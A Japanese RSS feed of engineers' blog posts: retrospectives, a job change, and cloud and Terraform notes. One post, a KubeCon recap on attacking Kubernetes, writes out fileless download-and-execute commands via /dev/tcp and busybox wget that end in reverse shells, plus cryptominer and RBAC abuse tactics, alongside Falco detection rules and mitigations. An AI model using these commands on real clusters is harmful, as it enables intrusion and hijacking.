<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
    <channel>
        <title>3-shake Engineers' Blogs</title>
        <link>https://blog.3-shake.com</link>
        <description>3-shake に所属するエンジニアのブログ記事をまとめています。</description>
        <lastBuildDate>Tue, 02 Jan 2024 18:31:39 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>ja</language>
        <image>
            <title>3-shake Engineers' Blogs</title>
            <url>https://blog.3-shake.com/og.png</url>
            <link>https://blog.3-shake.com</link>
        </image>
        <copyright>3-shake Inc.</copyright>
        <item>
            <title><![CDATA[技術書やブログ、登壇資料の参考文献は読んだ方がいい]]></title>
            <link>https://syu-m-5151.hatenablog.com/entry/2023/12/31/221026</link>
            <guid>https://syu-m-5151.hatenablog.com/entry/2023/12/31/221026</guid>
            <pubDate>Sun, 31 Dec 2023 13:10:26 GMT</pubDate>
            <content:encoded><![CDATA[はじめに今年は女との同棲を解消する。円形脱毛症と胃潰瘍になる。自分の身体から生気が抜ける感覚が多々ありました。また、人生最大限に体重が増加するなどの加齢を言い訳にしたイベントが目白押しでした。年末のこの時期は、振り返ったり新しいことを始めたくなるものです。しかし今日は、「技術書やブログ、登壇資料の参考文献は読んだ方がいい」というテーマについて、深掘りしてみたいと思います。技術の世界は日々進化し、新しい情報を取り入れることは不可欠ですが、新しい技術や理論の背後にある基礎知識や歴史にも目を向けることも同じかそれ以上に大事ではないでしょうか？参考文献の役割技術書やブログ、登壇資料には、文字やページの数や時間の制限があるため、著者や発表者は主要なポイントに焦点を当てて情報を伝えます。しかしこれらの表面に現れる情報だけでは、トピックの全貌を把握するのは難しいです。そこで重要になるのが、参考文献の役割です。これらは、トピックに関するより詳細な情報、歴史的背景、異なる視点やアプローチを提供し、より深い理解を促します。特に、複雑な技術や理論を扱う際には、参考文献が理解の鍵となります。ブログや登壇資料の表面だけを読んで分かったと思うのは容易いですが、実際の理解は表面的なものに過ぎないことが多いのです。認知科学者スティーブン・スローマンとフィリップ・ファーンバックの著書「知ってるつもり 無知の科学」では、人間の知性の限界と錯覚について詳しく論じられています。この本は、私たちが持つ「知識の錯覚」について解説しています。多くの人が、あるトピックについて理解していると自信を持っているが、実際にはその理解は浅いことが多いのです。これは、私たちの認知システムが複雑な情報を簡略化し、限られた情報から全体を理解したと錯覚する傾向があるためです。知ってるつもり　無知の科学 (ハヤカワ文庫NF)作者:スティーブン スローマン,フィリップ ファーンバック早川書房Amazonまた、エンジンコミュニティではダニング＝クルーガー効果という現象としても有名で、人々は自分の知識や能力を過大評価する傾向があります。これは特に、自分の知識が不足している分野で顕著に現れます。この効果は、単なる自信過剰にとどまらず、誤った情報や決定に基づく行動を引き起こすリスクを含んでいます。togetter.comこのようなわかったフリした認識の歪みを避けるためにも、参考文献を活用して自分の理解を深め、多角的な視点を持つことが重要です。参考文献は、知識の錯覚やダニング＝クルーガー効果に陥りがちな私たちの認識を補完し、より深い理解を促すためのものになり得ます。文献選びのポイント文献を選ぶ際には、その情報源の信頼性や、著者の専門性を評価することが大切です。現在の自分の知識レベルや興味のある領域に合った文献を選ぶことも重要です。一つのトピックについて、異なる角度から書かれた文献を読むことで、よりバランスの取れた理解が得られます。年末年始の休暇は、新しい知識を身につけるための絶好の機会です。選んだ文献をじっくりと読むことで、より学びを充実させることができます。文献選びに関しては、必ずしも難解なものを選ぶ必要はありません。例えば、参考文献に載ってる書籍の入門書を読むことは、知識の更新や基礎を再確認するためにも有効です。O'Reillyなどの専門書のサブスクリプションサービスを利用することで、「え、この本読むのに3000円か」と逡巡せずに幅広い分野の知識を得るための良い方法となります。最後にこのブログを通じて伝えたいのは、単に「技術書やブログ、登壇資料の参考文献は読んだ方がいい」というアドバイスではなく、むしろ「技術書やブログ、登壇資料の参考文献は読んでほしい」という切なる願いです。学びの過程で急ぎすぎず、じっくりと時間をかけて考えることは本当に大切です。表面的な理解に留まらず、深く内容を吟味し、背景や著者の意図を理解することで、真の学びが得られます。参考文献を読む際には、それらが提供する多様な視点や深い知識を活用し、幸せの分母を増やすような豊かな理解を目指すことが重要です。ゆっくりと考えることで、新しい発見や洞察が生まれ、学びの経験がより深いものになります。私たちは共に学び、共に成長することができます。皆さん、良いお年をお迎えください。新しい年にも、学びの喜びを共有し、一緒に成長していくことを心から楽しみにしています。そして、みなさんにも心から「参考文献をしっかりと読むこと」を勧めます。それによって、より深い知識と理解を得ることができ、幸せの分母を増やすための一歩となるでしょう。遅考術――じっくりトコトン考え抜くための「１０のレッスン」作者:植原 亮ダイヤモンド社Amazon]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[2023年の振り返りをする]]></title>
            <link>https://nnaka2992.hatenablog.com/entry/zatu/2023_furikaeri</link>
            <guid>https://nnaka2992.hatenablog.com/entry/zatu/2023_furikaeri</guid>
            <pubDate>Sun, 31 Dec 2023 13:00:10 GMT</pubDate>
            <content:encoded><![CDATA[みんな振り返りしてる。振り返りしてないのはお前だけ。なので振り返りします。登壇関係2023-06-22 3-shake SRE Tech Talk #6これまで対外向けの登壇は行なったことが無かったのでこれが登壇デビューでした。DBREノススメ所属会社である株式会社スリーシェイクの主催するイベントでしたが、一度登壇すると登壇のハードルが低くなるのでとてもいい機会でした。今の会社にDBREerポジションで入社して6か月目の登壇なので今見ると当時と違う意見の部分もあったりしますが、今もDBREもSREも何なのか分かりません。2023-09-26 YugabyteDB Japan Meetup #3別件でYugabyte Japanの方と話していたところ、登壇してみないか？ と誘われたためホイホイ話しに行った登壇でした。紹介 データベース信頼性エンジニアリングSRETTの方ではSREの存在を認知している方が多いだろうと想定して何故DBREが必要なのか？ という話しをしたのに対して、こちらではDB関係者が多いと想いDBAとDBREという切り口で発表しました。YugabyteDBはドキュメントを始めから読む活動をしていたり(2023年後半はあまり出来ていませんが)、ローカル環境で動かして遊んだりはしていたもののYugabyteDBについて話せるほどの理解は(今も)なく次にYugabyteDB Japan Meetupで話す機会があればYugabyteDBについてを主題に話したいと思いました。2023-10-12 3-shake SRE Tech Talk #76月の登壇と同様に所属会社主催のイベントでした。KubernetesでDBを動かしたい2021年ごろにDBをKubernetesで動かす記事見て以来DB on Kubernetesには興味があったのですが、Kubernetes自体やデータベースのお勉強をしていたらなかなかDB on k8sまでたどりつけていませんでした。それをイベント駆動で無理やり勉強したのがこのイベントでした。内容としてはありきたりですが、Zalando Postgres Operatorを動かしましたというだけのものですが、ここでDB on k8sをさわってからはいろいろな機会でDB on k8sを触るようになりました。2023-12-26 第44回 PostgreSQLアンカンファレンス@オンライン年内最後の登壇はPostgreSQLアンカンファレンスでした。pgrollで実現するスキーマブルーグリーンデプロイメントちょうど登壇しやすいネタを抱えてたのとアドベントカレンダーでそーだいさんが運用・開発よりの話しが足りないと書いていたのを見て、DBREを名乗っているし話さなきゃいけないだろと思ったので登壇しました。もっと運用よりだったりサービス開発だったり設計よりの話も募集中です。 大体そういうの喋る担当が自分だけなのでめちゃめちゃ需要があるので気軽にどうぞ。登壇自体はpodman-composeとdocker composeの差分で悲しいライブデモになりました。検証環境と登壇環境はそろえなきゃいけないなと思いました。ブログ関連はてなブログでは主に読んだ論文やドキュメントについてまとめ、zennでは何かを調べてまとめたものや検証した結果をまとめるように使い分け運用しました。はてなブログでやっているYugabyteDBのドキュメントを全部読む取り組みは途中で止ってしまっているので動かします。zennの方は社内向けに話すもののうち社外に出しても問題ないようなものを垂れ流していましす。2024年は技術検証方面に力をいれたいのでzennを活発に出来たらなと思います。アドベントカレンダーは大風呂敷で畳みきれなかったデータベースエンジニアのためのDB on Kubernetes入門ガイドに始まり、誰得なのかわからないAlloyDB omni on Kubernetesを眺めると続いて、sqldefとpgrollを利用したPostgreSQLでのスキーマブルーグリーンデプロイメントを書きました。ターゲットは誰だったんですかね？まとめ2023年は今までインプット重視だったところからアウトプットを考えだした年でした。これはそろそろアウトプットをしなきゃいけないという思いもあったものの、2023年1月に現職に転職し社外へのアウトプットをする人が多くいたからという面も多大にあります。人は周りの5人の平均になるという言葉があるらしいですが、まさしくその例で環境が変り周りの人が変ったため個人の方向性も変ったのではないかと思います。外部にアウトプットすることが偉いわけではありませんが、外部に発信すると新しい機会も産まれましたし1来年以降も継続していきたいです。↩]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[2023年の振り返り、そして転職]]></title>
            <link>https://blog.jigyakkuma.org/2023/12/31/recruit2023/</link>
            <guid>https://blog.jigyakkuma.org/2023/12/31/recruit2023/</guid>
            <pubDate>Sun, 31 Dec 2023 12:00:00 GMT</pubDate>
            <content:encoded><![CDATA[今年も特にアウトプットはできていないですが振り返りをすることにしました。理由はなんとなくタイトルで察するかと思います。2022年10月にスリーシェイクに転職したわけですが、そこでやると決めていたのは情シス人材の育成でした。育成の目標メンティーは年齢も情シスのキャリアもジュニアクラスでした。それを踏まえてどういった育成をすべきかと迷いましたが、漠然と「情シスのマネージャークラスを担える人材に育てる」ということは考えていました。心理的安全性の確保とコミュニケーション自身はメンティーからするとキャリアや社会人経験がかなり上ということもあり、コミュニケーションがひとつのハードルとなることを想定していたため心理的安全性を一番最初に取り組みました。最初にここを失敗すると関係性や仕事を進めるにも支障が出てしまうため優先度、重要度共に高く設定していました。コミュニケーションのルールを作らないGoogleカレンダーで予定を入れてGoogle Meetちょっと話す時は声掛けしてSlack Huddleでサッと話すたまの出社時には対面で話す非同期のコミュニケーションSlack上でも意見交換や議論を行える関係性の構築Slackで日報を書く習慣これらを進めていく中で守っていたことは「一方的なルールづくりをしない」でした。押し付けられるルールほど窮屈なものはなく、やらされ感が出てしまうためです。傾聴と自己開示コミュニケーションは傾聴と自己開示を特に意識していました。ヤフーの１ｏｎ１, 部下を成長させるコミュニケーションの技法を以前読んで以来、日頃からの姿勢として意識するようにはなりました。ただ、相手の話や考えをしっかり引き出せているかと言われると未だに自信がないですが…。自分の好きなもの/こと考え方や性質過去の失敗談今までやってきたこといま考えていること仕事につながりそうな話題は惜しみなく出し、そこから気づきを得てもらえるような話の出し方には気を使っていました。思いついたタイミングでだらだらと話してしまうと時間だけを使ってしまうので、関連した話題や同じような経験の話が出てきた時に紐付けるような形で話すことが多かったです。メンティーを知る育成をするにも闇雲に進めるわけにはいかないので構築した関係性を活かしてしっかりとヒアリングしていきました。気をつけていたこととしては、キャリアやスキルの違いからメンティーが萎縮しないような対話を意識していました。何が足りていないのかを知る本人の主観で足りていないもの一緒に仕事している人たちから見えているものヒアリング内容から自身が感じたもの何を考えているのかを知る仕事ぶりからみえてくるもの周りとのやり取りの仕方成果の内容会話から聞けるものも大事だけど、周りからの評価や見え方(=関係性)も同じくらい大事なので情報が偏向しないよう意識していました。目線合わせ育成を考えるにおいて目線がズレてしまうことがよく起こりそうなので気にしていました。また、自分のものさしではなくメンティーのものさしで成果をみて褒めるというのも気にしながら行っていました。どうしても自分のできることを基準にみていると「出来て当たり前」という評価になってしまうし、メンティーからしても自分よりスキルのある人からしたらまだまだ足りていないという当たり前をぶつけられていると感じてモチベーションは上がらないと思います。役割を伝えるメンティーを育成し、成果を上げてもらうのがメンターの成果なので以下のようなことはよく話していました。メンターは自身の成長のためのツールと思ってもらう時間を奪ってしまうという遠慮よりも積極的にコミュニケーションを取る姿勢を評価メンターが知っていることは聞いたり教えてもらってラーニングコストを下げるメンティーには自分の成長を第一に考えて仕事に取り組んでもらう日々業務だけではなく成長に繋がる業務もバランスよくやってもらうために手分けをする成果や目標の進捗は定例で確認、継続して意識してもらう仕事の中でメンティー自身だけだと乗り越えられないものに関しては課題を作成して解いてもらうということもしました。AWSという存在やサービス内容は説明を読めばなんとなくわかるけど実際に何から始めていいかわからない、といったものです。習慣化成長を感じられることとして、習慣を大事にするというのはあると思っています。日報は欠かさず書くやったこと、次にやること、その日の感想を簡単でもいいから書く一日を振り返ってよかったこと、よくなかったこと、わからなかったことなどを振り返る時間をつくるため時間経過後の振り返りにも使えるタスクは共有して見える化Notionでタスク管理タスク管理を始める→定着させることが目的情シスの業務はタスク管理対象にするかどうかという判断はわりと難しい情シスは日々変化する状況に合わせて改善していくためのタスクも多いので日々業務以外をタスクとして管理していました。日報は自分のためにもなる、というところが継続するモチベーションに繋がりやすいですが、タスク管理はどうしてもやらされる感が出てしまって継続が難しかったという反省がありました。振り返ってのまとめ今まで育成に携わることがなかったので自身としては始めての試みも多く、振り返りとしてはきれいにまとまっているようにみえるものの書籍からのインプットや見聞きしたことを真似してみるなどトライアンドエラーを繰り返していました。また、振り返えるとハードスキルより圧倒的にソフトスキルの比重が大きくなっていて、自身が何に重きを置いているのかも見えてきました。今年一年をまとめるとまずは関係性づくりとにかく話を聞き、相手をインプットするハードスキルよりソフトスキルから続けていくことと変化していくことのメリハリこういった内容でした。アンコントローラブルをコントロールしようとしないというのは常々考えてはいますが、育成はその積み重ねであると強く感じた一年でした。 自身の転職タイミングでジュニアメンバーを育成できる環境に出会えるというのはそうないと思うので、運も味方していたと言えそうです。そして転職今年一年を通して情報システム部のマネージャーとして、そしてメンバーの育成に従事してきました。転職のきっかけは元同僚であり、尊敬しているエンジニアの一人そんむーさんにお声がけいただいたからでした。スリーシェイクでは育成をはじめ、やり残したことがあり名残惜しいと思いつつも、急成長の中で会社/組織/カルチャーを一緒に作っていけるフェーズに参画できることを選択することにしました。株式会社ヘンリーでの仕事が始まります。情シスという切り口から少しでも医療業界に貢献できるようがんばります。]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[KubeCon NA 2023 Recap: Attacking Kubernetes 編]]></title>
            <link>https://kyohmizu.hatenablog.com/entry/2023/12/31/040720</link>
            <guid>https://kyohmizu.hatenablog.com/entry/2023/12/31/040720</guid>
            <pubDate>Sat, 30 Dec 2023 19:07:20 GMT</pubDate>
            <content:encoded><![CDATA[本記事は 3-shake Advent Calendar 2023 最終日の記事です。こんにちは、きょー (@kyohmizu) です少し旬を逃してしまいましたが、KubeCon NA 2023 の振り返りをしたいと思います。私はKubeConにはリアル参加しておらず、後からセッション動画を見ました。Kubernetes 編」ということで、Kubernetes へのサイバー攻撃テクニックに関するセッションを3つご紹介します。ちなみに本内容は、先日開催された CloudNative Days Tokyo 2023 にてお話しするか検討していたのですが、準備期間とセッション時間 (20分) の都合で泣く泣く諦めたものになります。 speakerdeck.comそれではセッション紹介に入ります。K8s Post-Exploitation: Privilege Escalation, Sidecar Container Injection, and Runtime Securityセッション情報Kubernetes クラスタに侵入した攻撃者が行う攻撃手法と、その対策を紹介するセッションです。最初に TeamTNT の行った攻撃キャンペーンについて、過去の調査レポートをベースに説明しています。クラスタへの初期アクセスの後、kubelet API のデフォルトポート (10250) を狙ってネットワークスキャンをかけています。スキャンによって kubelet API を発見した場合、kubelet API にPOSTリクエストを送り、最終的にノード内の全コンテナに対しクリプトマイナーをダウンロードします。詳細は調査レポートを参照いただきたいですが、攻撃コードを見るとどのように攻撃が行われるのかイメージしやすいと思います。この攻撃はアプリコンテナ内でクリプトマイナーを実行するため、早期に発見されてしまう可能性があります。そこでより発見されにくい攻撃手法として、セッション後半では「Sidecar Injection 攻撃」を取り上げています。Sidecar Injection 攻撃 は Microsoft の「Threat Matrix for Kubernetes」で紹介されている攻撃テクニックです。ちなみに MITRE ATT&CK の Containers Matrix にはこのテクニックは含まれていません。Sidecar Injection 攻撃は名前の通り、Pod 内のサイドカーコンテナを標的とします。セッション内で攻撃のサンプルコードが公開されていましたが、Pod 内のサイドカーコンテナのみを選択しクリプトマイナーを実行することを目的としているようでした。個人的にあまりピンと来なかったのは、アプリコンテナではなくサイドカーコンテナを狙うことで本当に攻撃を秘匿できるのか？という点です。サイドカーかはあまり関係ない気がします。そして最後に、これらの攻撃に対するセキュリティ対策について説明しています。Kubernetes セキュリティとして、イメージスキャンアドミッションコントロールランタイムセキュリティの3つのカテゴリを挙げ、実行中のコンテナに対する攻撃にはランタイムセキュリティが有効であると述べています。Falco を取り上げ、今回の攻撃に対する Falco ルールも公開されました。- list: shell_binaries  items: [bash, csh, ksh, sh, tcsh, zsh, dash]- macro: shell_procs  condition: proc.name in (shell_binaries)- rule: shell_in_container  desc: notice shell activity within a container  condition: >    spawned process and    container and    shell_procs  output: >    shell in a container    (user=%user.name container_id=%container.id container_name=%container.name    shell=%proc.name parent=%proc.pname cmdline=%proc.cmdline)  priority: WARNINGArbitrary Code & File Execution in R/O FS – Am I Write?セッション情報readOnlyRootFilesystem: true が設定されたコンテナにおいて、コンテナ内で攻撃コードを実行するテクニックを3つ紹介しています。Readonly Filesystem では、ファイルの読み込み (Read) と実行 (Execute) はできるが書き込み (Write) ができないという特徴があります。マルウェアを配置したりすることを防止します。ファイルレスマルウェアの攻撃も存在しますが、コンテナ内に curl や wget のようなツールが含まれていなければマルウェアをダウンロードできません。それではセッション内の3つのケースについて見ていきます。ここではすべてを紹介しきれないため、より詳しく知りたい方は動画を見たりツールを調べたりしてみてください。ケース1curl や wget のようなネットワークツールがない場合、どのように攻撃コードのファイルをダウンロードするのでしょうか？/dev/tcp を利用して TCP コネクションを確立し、ファイルをダウンロードしています。ただしダウンロードしたファイルを書き込むことはできないため、メモリ上で直接実行する必要があります。これには DDExec を使い、プロセスをハイジャックすることでファイルレス実行を可能にします。$ function __bindown () {  read proto server path <<<$(echo ${1//// })  FILE=/${path// //}  HOST-${server//:*}  PORT=${server//*:}  [[ x"$(HOST)" == x"${PORT}" ]] && PORT=8080  exec 3<>/dev/tcp/${HOST]/$PORT  echo -en "GET ${(FILE) HTTP/1.0\r\nHost: $(HOST)\r\n\r\n" >&3  (while read line; do  [[ "$line" == $'\r' ]] && break  done && cat) <&3  exec 3>&-}$ __bindown http://192.168.88.4:8080/shell.b64 | bash <(__bindown http://192.168.88.4:8080/ddexec.sh)base64 エンコードした攻撃用バイナリと ddexec.sh をそれぞれダウンロードし、ddexec.sh は bash で実行します。ケース2今回はコンテナイメージとして alpine を利用しています (ケース1は nginx でした)。alpine には bash が存在せず、/dev/tcp をそのまま実行することができないため、別の方法でファイルのダウンロードを試みます。curl や wget は存在しませんが、alpine には busybox がインストールされています。ファイルのダウンロードには busybox wget を利用し、ダウンロード先には Readonly RootFS の中でも書き込み可能な tmpfs を選択しています。$ mount | grep shmshm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)バイナリコードを直接実行できる ddsc.sh をダウンロードし、/dev/shm に保存します。noexec でマウントされているためファイルの実行はできませんが、ddsc.sh はシェルスクリプトなので sh から実行可能です。$ dde=$(mktemp -p /dev/shm)$ busybox wget -O - https://raw.githubusercontent.com/arget13/DDexec/main/ddsc.sh > $dde$ code=$(mktemp -p /dev/shm)$ echo "6a295899...60f05" > $code$ sh $dde -x < $codeケース3ケース2と同じマニフェストから作られた alpine コンテナの環境です。ファイルのダウンロードには引き続き busybox を利用しています。termination-log にファイルを保存し、リンカを利用してファイルを実行します。Kubernetes にはコンテナの終了メッセージを取得する機能があり、取得元ファイルのデフォルトパスが /dev/termination-log となっています。元々終了メッセージを書き込むことを想定したファイルなので、当然ながら書き込み可能です。これを攻撃用ファイルのダウンロード先に利用します。(終了メッセージの詳細は公式ドキュメントを参照ください)$ mount | grep termination-log/dev/vda1 on /dev/termination-log type ext4 (rw,relatime)mount コマンドの結果から、termination-log のマウントには noexec 属性がついていないことがわかります。これによりリンカを利用したファイル実行が可能となります。$ lddmusl libc (x86_64)Version 1.2.4_git20230717Dynamic Program LoaderUsage: /lib/ld-musl-x86_64.so.1 [options] [--] pathnameldd コマンドにより、リンカの使い方は /lib/ld-musl-x86_64.so.1 [実行ファイルのパス] であることがわかりました。あとは攻撃用ファイルをダウンロードして実行するだけです。$ busybox wget -O - https://raw.githubusercontent.com/arget13/DDexec/main/c-shell > /dev/termination-log$ /lib/ld-musl-x86_64.so.1 /dev/termination-logケース1, 2と同様、実行後にはリバースシェルが確立されています。攻撃テクニックの説明は以上となります。seccomp や SELinux の活用termination-log の場所の指定コンテナ内の通信やプロセスの監視seccomp や SELinux は対策としては一般的ですが、termination-log については聞いたことがなく、興味深い内容でした。ただしログの場所を変更できても noexec を付与する方法は見つけられなかったので、有効な対策と言えるかどうかはやや疑問が残りました。ケース2の /dev/shm を利用した攻撃については、検知するための Falco ルールも例示されました。- rule: Execution from /dev/shm  desc: This rule detects file execution from the /dev/shm directory,    a common tactic for threat actors to stash their readable+writable+(sometimes)executable files.  condition: >    spawned_process and    (proc.exe startswith "/dev/shm/" or    (proc.cwd startswith "/dev/shm/" and proc.exe startswith "./" ) or    (shell_procs and proc.args startswith "-c /dev/shm") or    (shell_procs and proc.args startswith "-i /dev/shm") or    (shell_procs and proc.args startswith "/dev/shm") or    (proc.args contains "/dev/shm" or proc.cwd startswith "/dev/shm") or    (proc.cwd startswith "/dev/shm/" and proc.args startswith "./" ))    and not container.image.repository in (falco_privileged_images, trusted_images)  output: "File execution detected from /dev/shm    (proc.cmdline=%proc.cmdline connection=%fd.name user.name=%user.name user.loginuid=%user.loginuid    container.id=%container.id evt.type=%evt.type evt.res=%evt.res proc.pid=%proc.pid proc.cwd=%proc.cwd proc.ppid=%proc.ppid    proc.pcmdline=%proc.pcmdline proc.sid=%proc.sid proc.exepath=%proc.exepath user.uid=%user.uid    user.loginname=%user.loginname group.gid=%group.gid group.name=%group.name container.name=%container.name image=%container.image.repository)"  priority: WARNING本セッションは発表者が6月に投稿した記事をもとにしているようなので、併せて読んでいただくと良いかもしれません。また資料中の Pod のマニフェストはそのまま apply するとエラーになるため、ご自身で環境を再現したい方は以下をご利用ください。ケース1:apiVersion: v1kind: Podmetadata:  name: method1-podspec:  containers:  - name: nginx    image: nginx:latest    securityContext:      readOnlyRootFilesystem: true      runAsUser: 101    ports:    - containerPort: 80    volumeMounts:    - mountPath: /var/run      name: run    - mountPath: /var/cache/nginx      name: nginx-cache  securityContext:    seccompProfile:      type: RuntimeDefault  volumes:  - name: run    emptyDir: {}  - name: nginx-cache    emptyDir: {}ケース2, 3:apiVersion: v1kind: Podmetadata:  name: method2-podspec:  containers:  - name: alpine    image: alpine    command:      - sleep    args:      - "3600"    securityContext:      readOnlyRootFilesystem: true      runAsUser: 65534  securityContext:    seccompProfile:      type: RuntimeDefaultRBACdoors: How Cryptominers Are Exploiting RBAC Misconfigsセッション情報system:anonymous ユーザーに cluster-admin ロールを付与していた場合の攻撃事例を紹介しています。cluster-admin は事前定義された ClusterRole で、クラスタ内のすべてのリソースに対する権限を持っています。system:anonymous は匿名リクエストに対して割り当てられているユーザーです。Kubernetes クラスタに対して認証なしであらゆるリソース操作ができてしまいます。今回の攻撃シナリオは以下の通りです。Kubernetes API Server をスキャンし、設定ミスのあるクラスタを発見DaemonSet としてクリプトマイナー (XMRig) を設置cluster-admin の証明書を作成し、クラスタへの侵害を永続化証明書作成の痕跡を削除興味深い点として、クリプトマイナーを設置する際に ClusterRoleBinding と DaemonSet を作成しますが、リソース名を kube-controller とすることで正規のリソースを偽装しています。運用業務でクラスタ内のリソースを確認したとしても、クリプトマイナーの存在に気づかないかもしれません。リポジトリも kubernetesio/~ のように偽装しています。また今回はCSRを削除していますが、cluster-admin を持っていれば、クラスタ内で行われる検知の回避や防御の無効化も容易にできてしまいます。クラスタとは別のレイヤーで、監査ログの監視などを行う必要があるかもしれません。パブリッククラウドを利用する場合、クラスタ内のセキュリティ対策とクラウド上の監視サービスを併用するのが良さそうです。セッション後半では、取るべきセキュリティ対策について紹介しています。Kubernetes API Server へのアクセスのネットワーク制限--anonymous-auth=false による匿名リクエストを無効化アドミッションコントローラーによる cluster-admin のバインディング禁止検知策として、設定ミスの検知Kubernetes API への攻撃の検知マイニングの検知のそれぞれ3つの対策が挙げられています。設定ミスの対策では、system:anonymous や system:authenticated に付与された権限がないか確認するためのスクリプトが紹介されています。Kubernetes の監査ログを監視することも有効です。Google Cloud の Security Command Center (SCC) には脅威検知の機能がありますが、この機能を利用すれば GKE に対する設定ミスや攻撃を検知できます。(発表者は Google Cloud の方です)マイニングの検知について、IoC (Indicator of Compromise) を利用する方法がセッション内では紹介されています。既知のマルウェアコンテナや悪意のあるバイナリ、攻撃サーバのIPアドレス等と照合することで攻撃を検知します。SCC におけるマイニング検知のベストプラクティスも興味があれば読んでみてください。おわりにいかがだったでしょうか？Kubernetes への攻撃手法を知ることは、(それ自体面白いというのもありますが) リスクベースのセキュリティ対策を検討する上で非常に有用です。このセキュリティ対策はどのような攻撃リスクを軽減してくれるのかこの攻撃が行われた場合、どのセキュリティ対策によって防ぐことができるのかといった観点で考えてみることをお勧めします。Kubernetes クラスタを目指して、皆で取り組んでいきましょう。]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Step Functionsを利用してNAT Gatewayを自動作成/削除する]]></title>
            <link>https://qiita.com/ys1/items/abf8daab19f616b3d854</link>
            <guid>https://qiita.com/ys1/items/abf8daab19f616b3d854</guid>
            <pubDate>Fri, 29 Dec 2023 15:25:41 GMT</pubDate>
            <content:encoded><![CDATA[概要本記事ではStep Functionsを利用して、Nat Gatewayを自動で作成/削除する方法について記載します。NAT Gatewayは作成しているだけでコストがかかるリソースであり、…]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Googleが提供するBIツール「Looker」とは？]]></title>
            <link>https://sreake.com/blog/learn-about-looker/</link>
            <guid>https://sreake.com/blog/learn-about-looker/</guid>
            <pubDate>Thu, 28 Dec 2023 00:11:29 GMT</pubDate>
            <content:encoded><![CDATA[はじめに 2023年10月30日、Googleが提供するBIツール「Looker」が政府認定クラウドサービス(通称 ISMAP) に認定されました。「Looker」が“政府認定クラウドサービス”に　Google提供のBI […]The post Googleが提供するBIツール「Looker」とは？ first appeared on sreake.com | 株式会社スリーシェイク.]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Google Cloud 検証環境を頑張りすぎず良い感じに整えた話]]></title>
            <link>https://sreake.com/blog/make-better-google-cloud-verification/</link>
            <guid>https://sreake.com/blog/make-better-google-cloud-verification/</guid>
            <pubDate>Mon, 25 Dec 2023 23:43:35 GMT</pubDate>
            <content:encoded><![CDATA[はじめに こんにちは！Sreake事業部 横尾（@866mfs）です。 3-shakeでは、社員なら誰でもGoogle Cloud の各種サービスを検証できる、検証環境アカウント（ここでは ”test.org” と表記） […]The post Google Cloud 検証環境を頑張りすぎず良い感じに整えた話 first appeared on sreake.com | 株式会社スリーシェイク.]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Kubernetesのソースコードを読む Kubelet編]]></title>
            <link>https://qiita.com/ys1/items/7a455c602424e591fe38</link>
            <guid>https://qiita.com/ys1/items/7a455c602424e591fe38</guid>
            <pubDate>Mon, 25 Dec 2023 15:06:41 GMT</pubDate>
            <content:encoded><![CDATA[起動処理Kubeletの起動処理についてソースコードを追っていき、どんな処理をしているのかみていきたいと思います。読むソースコード: バージョン: v1.27.2https://github.…]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[GitHub Actions で cosign を使って keyless 署名する]]></title>
            <link>https://qiita.com/yteraoka/items/db13b1dd94fa9e115676</link>
            <guid>https://qiita.com/yteraoka/items/db13b1dd94fa9e115676</guid>
            <pubDate>Sun, 24 Dec 2023 14:16:16 GMT</pubDate>
            <content:encoded><![CDATA[この記事は、3-shake Advent Calendar 2023 24日目のエントリ記事です。Container image が適切な方法で build されたものかどうかを確認するために署名…]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Terraformのtfstateについて考える]]></title>
            <link>https://blog.masasuzu.net/entry/2023/12/23/000000</link>
            <guid>https://blog.masasuzu.net/entry/2023/12/23/000000</guid>
            <pubDate>Fri, 22 Dec 2023 15:00:00 GMT</pubDate>
            <content:encoded><![CDATA[この記事は3-shake Advent Calendar 2023の23日目の記事となります。3-shakeのカレンダー | Advent Calendar 2023 - QiitaこちらはSRE Tech Talk #6で話した内容に補足したものです。3-shake SRE Tech Talk #6 - connpass資料はこちらとなります。    tfstateとはtfstateの課題tfstateの管理場所をどうするか問題localS3/Google Cloud StorageGitLabTerraform Cloudtfstateを管理するリソースをどう管理する問題aws/gcloud コマンドterraform + local state 管理CloudFormation / Google Deployment Managertfstateをどう分割するか問題環境分離パターンディレクトリ分離パターンbackend-configパターンworkspace環境分離以外の分割をどうするか問題分割する観点プロバイダーで分割管理権限で分割変更頻度で分割依存の方向性で分割tfstate間のリソース参照まとめtfstateとはTerraformが管理しているリソースの状態を表すjson形式のファイルです。tfstateとterraformファイルと実際のリソースの状態を比較して、terraformコマンドが実行されます。一般的には直接変更せずterraform stateコマンドを通して変更を行い、一般ユーザがtfstateに触れることはないです。参考: Backend Configuration - Configuration Language | Terraform | HashiCorp Developertfstateの課題tfstateについて以下の課題があります。それぞれについて見ていきます。tfstateの管理場所tfstateを管理するリソースの管理tfstateの分割tfstateの管理場所をどうするか問題主な保存場所候補としては以下のものがあります。local(デフォルト)クラウドのオブジェクトストレージS3/Google Cloud StorageGitレポジトリ統合GitLabSaaS利用Terraform CloudlocalTerraformのデフォルト保存先です。Terraformを実行する同じディレクトリのterraform.tfstateに保存されます。1人もしくは変更頻度が著しく低い状況など特殊なとき使えるものとなります。git管理して複数人で使うこともできるが、コンフリクトが発生しうるので、チーム開発には向かないです。基本的には複数人でterraformを使用するときは非推奨です。参考: Backend Type: local | Terraform | HashiCorp DeveloperS3/Google Cloud Storage監理するクラウドのオブジェクトストレージに保存する方法です。これが標準的(当社比)なのかなと思っています。オブジェクトストレージなので、権限があればどこからでもアクセスすることができます。それゆえ、同時にTerraformが実行されるので排他ロックの処理が必要となります。S3バックエンドを使用した場合はDynamoDBを使用してstate lockを実現します。Google Cloud Storageは単体でstate lockをサポートしています。tfstateの参照権限をクラウドのIAMで制御する必要があります。参考: Backend Type: s3 | Terraform | HashiCorp Developer参考: Backend 